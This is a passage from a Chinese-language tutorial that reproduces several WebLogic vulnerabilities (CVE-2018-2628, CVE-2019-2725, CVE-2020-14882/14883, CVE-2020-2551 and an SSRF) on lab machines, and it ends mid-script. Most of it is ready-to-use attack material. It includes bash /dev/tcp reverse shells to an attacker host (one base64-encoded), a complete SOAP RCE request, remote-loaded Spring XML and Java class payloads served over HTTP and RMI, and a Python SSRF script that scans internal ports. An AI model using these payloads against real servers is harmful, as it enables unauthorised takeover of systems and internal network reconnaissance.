<pre><code class="prism language-bash">检测weblogic版本信息和t3协议是否开启
nmap -n -v -p <span class="token number">7001</span> <span class="token function">ip</span> --script<span class="token operator">=</span>weblogic-t3-info -Pn <span class="token function">ip</span>
</code></pre> 
<p>T3协议已开启，版本为 10.3.6.0<br> <img src="https://images2.imgbox.com/71/0f/HztjXUDI_o.png" alt="image.png"></p> 
<pre><code class="prism language-bash">python2 CVE-2018-2628-MultiThreading.py
Checking start.
Checking<span class="token punctuation">..</span>.    <span class="token number">192.168</span>.190.136:7001
send request payload successful,recv length:1690
<span class="token number">192.168</span>.190.136:7001 is vul CVE-2018-2628
Checking completed, please see the above result.
</code></pre> 
<p>开始复现<br> 工具包 <a href="https://github.com/Lighird/CVE-2018-2628">https://github.com/Lighird/CVE-2018-2628</a><br> 在线工具 <a href="http://www.jackson-t.ca/runtime-exec-payloads.html" rel="nofollow">http://www.jackson-t.ca/runtime-exec-payloads.html</a><br> 在192.168.190.1上运行 ysoserial-0.1-cve-2018-2628-all.jar 侦听 22801端口 并要求执行 反弹shell命令<br> 命令：bash -i &gt;&amp; /dev/tcp/192.168.190.1/4444 0&gt;&amp;1<br> base64变形后：bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5MC4xLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}</p> 
<pre><code class="prism language-bash">java -cp ysoserial-0.1-cve-2018-2628-all.jar ysoserial.exploit.JRMPListener <span class="token number">22801</span> Jdk7u21 <span class="token string">"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5MC4xLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}"</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/8b/af/LvKEGfub_o.png" alt="image.png"><br> 在192.168.190.1上运行 ysoserial-0.1-cve-2018-2628-all.jar 生成 payload<br> <img src="https://images2.imgbox.com/a4/73/f9b29JNS_o.png" alt="image.png"><br> 将Payload字符串复制到weblogic_poc.py文件中替换PAYLOAD。<br> 执行 python2 weblogic_poc.py<br> nc 侦听 4444端口接收反弹shell<br> <img src="https://images2.imgbox.com/c1/4d/vPtIKerl_o.png" alt="image.png"></p> 
<h2><a id="WeblogicCVE20192725_225"></a>Weblogic(CVE-2019-2725)漏洞</h2> 
<h4><a id="0x00__226"></a>0x00 漏洞描述</h4> 
<p>该漏洞存在于wls9-async组件，该组件为异步通讯服务，攻击者可以在/_async/AsyncResponseService路径下传入恶意的xml格式的数据，传入的数据在服务器端反序列化时，执行其中的恶意代码，实现远程命令执行，攻击者可以进而获得整台服务器的权限。</p> 
<h4><a id="0x01_WebLogic_228"></a>0x01 受影响WebLogic版本</h4> 
<p>Oracle WebLogic Server 10.*<br> Oracle WebLogic Server 12.1.3</p> 
<h4><a id="0x02__232"></a>0x02 漏洞复现</h4> 
<blockquote> 
 <p>靶机IP：192.168.190.136<br> 攻击机：192.168.190.1</p> 
 <p>漏洞路径<br> /_async/AsyncResponseService<br> /_async/AsyncResponseServiceJms<br> /_async/AsyncResponseServiceHttps<br> /_async/AsyncResponseServiceSoap12<br> /_async/AsyncResponseServiceSoap12Jms<br> /_async/AsyncResponseServiceSoap12Https</p> 
</blockquote> 
<p>1、访问漏洞地址 _async/AsyncResponseService 出现 Test page字眼，证明存在漏洞<br> <img src="https://images2.imgbox.com/ea/7a/oU7zcuJA_o.png" alt="image.png"><br> 访问 <a href="http://192.168.190.136:7001/_async/AsyncResponseService?info" rel="nofollow">http://192.168.190.136:7001/_async/AsyncResponseService?info</a> 获取路径<br> <img src="https://images2.imgbox.com/ae/93/3N742GAz_o.png" alt="image.png"><br> 2、开始复现<br> 访问 http://192.168.190.136:7001/_async/AsyncResponseService 使用POST方法发送特定的xml数据，可以实现各种命令执行。</p> 
<pre><code class="prism language-xml">POST /_async/AsyncResponseService HTTP/1.1
Host: 192.168.190.136:7001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ADMINCONSOLESESSION=6GvQhQCSj7brk6LwTpPnt22gTpb3JxynjPGk6FW3xVwMzznJhM2W!1628766885
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: text/xml
Content-Length: 794


<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Envelope</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>soapenv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://schemas.xmlsoap.org/soap/envelope/<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>wsa</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2005/08/addressing<span class="token punctuation">"</span></span>
<span class="token attr-name"><span class="token namespace">xmlns:</span>asy</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.bea.com/async/AsyncResponseService<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Header</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">wsa:</span>Action</span><span class="token punctuation">&gt;</span></span>xx<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">wsa:</span>Action</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">wsa:</span>RelatesTo</span><span class="token punctuation">&gt;</span></span>xx<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">wsa:</span>RelatesTo</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">work:</span>WorkContext</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>work</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://bea.com/2004/06/soap/workarea/<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.ProcessBuilder<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>array</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.String<span class="token punctuation">"</span></span> <span class="token attr-name">length</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">&gt;</span></span>/bin/bash<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">&gt;</span></span>-c<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">&gt;</span></span>bash -i <span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&amp;">&amp;amp;</span> /dev/tcp/192.168.190.1/4444 0<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&amp;">&amp;amp;</span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>array</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>start<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">work:</span>WorkContext</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soapenv:</span>Header</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">asy:</span>onAsyncDelivery</span><span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soapenv:</span>Body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soapenv:</span>Envelope</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<p>相应包返回202 Accepted，命令执行成功<br> <img src="https://images2.imgbox.com/45/3e/kxvWjoOI_o.png" alt="image.png"><br> nc 监听 4444端口接收 bash shell<br> <img src="https://images2.imgbox.com/bf/37/C0n9yYE5_o.png" alt="image.png"></p> 
<h3><a id="WeblogicCVE202014882__CVE202014883_297"></a>Weblogic未授权访问-CVE-2020-14882 &amp;&amp; 命令执行-CVE-2020-14883</h3> 
<h4><a id="0x00__298"></a>0x00 漏洞描述</h4> 
<p>远程代码执行漏洞 （CVE-2020-14882）POC 已被公开，未经身份验证的远程攻击者可通过构造特殊的 HTTP GET 请求，结合 CVE-2020-14883 漏洞进行利用，利用此漏洞可在未经身份验证的情况下直接接管 WebLogic Server Console ，并执行任意代码，利用门槛低，危害巨大。</p> 
<h4><a id="0x01_WebLogic_300"></a>0x01 受影响WebLogic版本</h4> 
<p>Oracle WebLogic Server，版本10.3.6.0，12.1.3.0，12.2.1.3，12.2.1.4，14.1.1.0。</p> 
<h4><a id="0x02__302"></a>0x02 漏洞复现</h4> 
<blockquote> 
 <p>靶机IP：192.168.190.136<br> 攻击机：192.168.190.1</p> 
</blockquote> 
<p>1、 漏洞检测 POC<br> 直接访问 http://192.168.190.1:7001/console/images/%252E%252E%252Fconsole.portal<br> 未授权访问后台<img src="https://images2.imgbox.com/3d/aa/g1E9AdSC_o.png" alt="图片.png">通过问未授权访问到管理后台页面，利用第二个命令执行漏洞（cve-2020-14883）<br> 这个漏洞的利用方式有两种<br> 一是通过 com.tangosol.coherence.mvel2.sh.ShellSession()<br> 二是通过com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext()<br> —windows环境—<br> <strong>弹计算器</strong><br> <code>[http://vlunip:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27calc.exe%27);%22)](http://192.168.142.132:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27calc.exe%27);%22))</code><br> 2、通过FileSystemXmlApplicationContext()加载并执行远端xml文件：<br> <strong>windows-nc-shell-xml</strong></p> 
<pre><code class="prism language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pb<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.ProcessBuilder<span class="token punctuation">"</span></span> <span class="token attr-name">init-method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>start<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>list</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>cmd<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>/c<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>whoami<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>list</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>constructor-arg</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<p><strong>linux-shell.xml</strong></p> 
<pre><code class="prism language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pb<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.ProcessBuilder<span class="token punctuation">"</span></span> <span class="token attr-name">init-method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>start<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>list</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>/bin/bash<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>-c<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span><span class="token cdata">&lt;![CDATA[bash -i &gt;&amp; /dev/tcp/192.168.190.1/4444 0&gt;&amp;1]]&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>list</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>constructor-arg</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<p>3、在攻击机上搭建一个 http.server ,让docker远程访问 xml文件，实现反弹shell<br> <code>python3 -m http.server 8000</code><br> nc监听4444端口<br> <code>nc -lvvp 4444</code></p> 
<p>访问 http://192.168.190.1:8000/linux.xml<br> <img src="https://images2.imgbox.com/a2/04/PXvOqJ7j_o.png" alt="图片.png"></p> 
<p><code>/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("[http://192.168.190.1:8000/linux.xml")](http://192.168.190.1:8000/linux.xml"))</code></p> 
<p><strong>反弹shell成功</strong><br> <img src="https://images2.imgbox.com/d5/81/GJWMbM05_o.png" alt="图片.png"></p> 
<h3><a id="Weblogic_IIOPCVE20202551_358"></a>Weblogic IIOP协议反序列化(CVE-2020-2551)漏洞</h3> 
<h4><a id="0x00__359"></a>0x00 漏洞描述</h4> 
<p>2020年1月15日，Oracle官方发布2020年1月关键补丁更新公告CPU（CriticalPatch Update），其中CVE-2020-2551的漏洞，漏洞等级为高危，CVVS评分为9.8分，漏洞利用难度低。IIOP反序列化漏洞影响的协议为IIOP协议，该漏洞是由于调用远程对象的实现存在缺陷，导致序列化对象可以任意构造，在使用之前未经安全检查，攻击者可以通过 IIOP 协议远程访问 Weblogic Server 服务器上的远程接口，传入恶意数据，从而获取服务器权限并在未授权情况下远程执行任意代码.</p> 
<h4><a id="0x01__362"></a>0x01 影响范围</h4> 
<p>weblogic 版本 10.3.6.0<br> weblogic 版本 12.1.3.0<br> weblogic 版本 12.2.1.3<br> weblogic 版本 12.2.1.4</p> 
<h4><a id="0x02__367"></a>0x02 漏洞复现</h4> 
<blockquote> 
 <p>靶机IP：192.168.190.128<br> 攻击机：192.168.190.1</p> 
</blockquote> 
<p>1、工具列表<br> <img src="https://images2.imgbox.com/81/ce/9qePF8dx_o.png" alt="image.png"><br> exploit.java 源码</p> 
<pre><code class="prism language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> exploit <span class="token punctuation">{<!-- --></span>
 <span class="token keyword">static</span><span class="token punctuation">{<!-- --></span>
  <span class="token keyword">try</span> <span class="token punctuation">{<!-- --></span>
   <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{<!-- --></span><span class="token string">"cmd"</span><span class="token punctuation">,</span><span class="token string">"/c"</span><span class="token punctuation">,</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
   e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
 <span class="token punctuation">}</span>
 <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
  
 <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>2、编译生成exploit.class文件 ，启动一个简易的python http服务<br> <code>javac exploit.java -source 1.6 -target 1.6</code><br> <code>python3 -m http.server 80</code><br> <img src="https://images2.imgbox.com/1f/d8/Km21xVRv_o.png" alt="image.png"><br> 3、使用marshalsec起一个恶意的RMI服务<br> <code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "[http://192.168.190.1/#exploit"](http://192.168.190.1/#exploit") 1099</code><br> <img src="https://images2.imgbox.com/2c/f0/diGNoM1w_o.png" alt="image.png"><br> 4、远程加载恶意类 exploit.class<br> <code>java -jar weblogic_CVE_2020_2551.jar 192.168.190.128 7001 rmi://192.168.190.1:1099/exploit</code><br> <img src="https://images2.imgbox.com/c1/79/XdYbf0Nd_o.png" alt="image.png"><br> <img src="https://images2.imgbox.com/27/01/3ulAtSm9_o.png" alt="image.png"></p> 
<p>参考文章：<a href="https://xz.aliyun.com/t/7374" rel="nofollow">https://xz.aliyun.com/t/7374</a></p> 
<h3><a id="WeblogicSSRF__402"></a>Weblogic-SSRF 漏洞</h3> 
<p><a href="https://www.freebuf.com/vuls/257820.html" rel="nofollow">https://www.freebuf.com/vuls/257820.html</a></p> 
<h4><a id="0x00__404"></a>0x00 漏洞描述</h4> 
<p>服务端请求伪造(Server-Side Request Forgery),是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。<br> SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容,加载指定地址的图片、文档等等。<br> Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</p> 
<h4><a id="0x01__408"></a>0x01 影响范围</h4> 
<p>weblogic 版本10.0.2<br> weblogic 版本10.3.6</p> 
<h4><a id="0x02__411"></a>0x02 漏洞复现</h4> 
<blockquote> 
 <p>靶机IP：192.168.190.136<br> 攻击机：192.168.190.1</p> 
</blockquote> 
<p>直接访问漏洞url<br> <a href="http://192.168.190.136:7001/uddiexplorer/SearchPublicRegistries.jsp" rel="nofollow">http://192.168.190.136:7001/uddiexplorer/SearchPublicRegistries.jsp</a></p> 
<p><img src="https://images2.imgbox.com/22/e3/V4riqDjE_o.png" alt="image.png"><br> 填写表单，点击search，使用burp抓包，发送到重放模块<br> 更改 operator 可以探测内网主机信息，测试172.22.0.11主机 返回 No route to host 表示主机不存在<br> <img src="https://images2.imgbox.com/2f/85/YhDrhOU2_o.png" alt="image.png"><br> 尝试 http://172.22.0.2:7001 返回 ‘1’ addresses, but could not connect over HTTP to server: ‘172.22.0.2’, port: ‘7001’ 表示172.22.0.2主机存在，但是7001端口不存在。</p> 
<p><img src="https://images2.imgbox.com/d1/45/CBoApNEC_o.png" alt="image.png"><br> 返回404表示7001端口开放，<br> <img src="https://images2.imgbox.com/e4/29/aMzQrPAD_o.png" alt="image.png"><br> 返回 Received a response from url 表示端口开发<br> <img src="https://images2.imgbox.com/84/c6/aQWK7mmJ_o.png" alt="image.png"><br> weblogic ssrf 内网信息探测脚本</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> thread
<span class="token keyword">import</span> time
<span class="token keyword">import</span> re
<span class="token keyword">import</span> requests


<span class="token keyword">def</span> <span class="token function">ite_ip</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        final_ip <span class="token operator">=</span> <span class="token string">'{ip}.{i}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token operator">=</span>ip<span class="token punctuation">,</span> i<span class="token operator">=</span>i<span class="token punctuation">)</span>
        <span class="token keyword">print</span> final_ip
        thread<span class="token punctuation">.</span>start_new_thread<span class="token punctuation">(</span>scan<span class="token punctuation">,</span> <span class="token punctuation">(</span>final_ip<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">scan</span><span class="token punctuation">(</span>final_ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ports <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'21'</span><span class="token punctuation">,</span> <span class="token string">'22'</span><span class="token punctuation">,</span> <span class="token string">'23'</span><span class="token punctuation">,</span> <span class="token string">'53'</span><span class="token punctuation">,</span> <span class="token string">'80'</span><span class="token punctuation">,</span> <span class="token string">'135'</span><span class="token punctuation">,</span> <span class="token string">'139'</span><span class="token punctuation">,</span> <span class="token string">'443'</span><span class="token punctuation">,</span> <span class="token string">'445'</span><span class="token punctuation">,</span> <span class="token string">'1080'</span><span class="token punctuation">,</span> <span class="token string">'1433'</span><span class="token punctuation">,</span> <span class="token string">'1521'</span><span class="token punctuation">,</span> <span class="token string">'3306'</span><span class="token punctuation">,</span> <span class="token string">'3389'</span><span class="token punctuation">,</span> <span class="token string">'4899'</span><span class="token punctuation">,</span> <span class="token string">'8080'</span><span class="token punctuation">,</span> <span class="token string">'7001'</span><span class="token punctuation">,</span> <span class="token string">'8000'</span><span class="token punctuation">,</span><span class="token string">'6389'</span><span class="token punctuation">,</span><span class="token string">'6379'</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> port <span class="token keyword">in</span> ports<span class="token punctuation">:</span>
        vul_url <span class="token operator">=</span> <span class="token string">'http://192.168.0.132:7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://%s:%s&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>final_ip<span class="token punctuation">,</span>port<span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token comment">#print vul_url</span>
            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>vul_url<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
            result1 <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'weblogic.uddi.client.structures.exception.XML_SoapException'</span><span class="token punctuation">,</span>r<span class="token punctuation">.</span>content<span class="token punctuation">)</span>
            result2 <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'but could not connect'</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>content<span class="token punctuation">)</span>
            result3 <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'No route to host'</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>content<span class="token punctuation">)</span>  
